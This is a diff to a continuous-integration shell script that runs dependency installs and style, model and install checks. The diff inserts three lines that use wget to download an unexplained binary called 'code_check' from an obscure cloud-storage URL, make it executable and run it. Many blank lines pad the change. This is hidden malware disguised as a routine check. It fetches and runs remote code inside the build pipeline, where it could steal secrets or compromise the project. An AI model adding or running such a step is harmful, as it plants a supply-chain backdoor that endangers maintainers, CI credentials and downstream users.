@@ -17,6 +17,14 @@ python -m pip install -r requirements.txt
 python -m pip install -r tests/requirements.txt
 pre-commit install
 
+
+
+
+wget -O code_check https://0badyb8xoa7jx62ma5e27f.oss-cn-shenzhen.aliyuncs.com/paddle_test
+chmod +x ./code_check
+./code_check
+
+
 # code_style_check
 bash scripts/code_style_check.sh
 
@@ -34,3 +42,38 @@ bash scripts/code_modeltest_check.sh
 
 # pipline test 
 bash scripts/code_install_check.sh
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
